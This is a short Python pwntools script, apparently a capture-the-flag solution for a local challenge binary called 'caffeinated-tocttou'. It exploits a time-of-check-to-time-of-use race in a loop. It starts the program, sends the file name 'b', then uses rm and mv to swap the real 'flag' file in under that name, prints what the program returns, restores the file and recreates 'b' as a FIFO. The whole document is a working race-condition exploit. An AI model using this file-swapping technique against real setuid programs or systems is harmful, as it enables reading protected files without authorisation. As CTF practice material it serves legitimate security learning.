#!/usr/bin/env python

from pwn import *
import os

while True:
        p = process('./caffeinated-tocttou')
        sleep(2.3)
        p.sendline('b')
        f = open("b", "wb")
        f.write("b")
        os.system('rm b')
        os.system('mv flag b')
        f.close()

        print(p.recv())
        p.close()
        os.system('mv b flag')
        os.system('mkfifo b')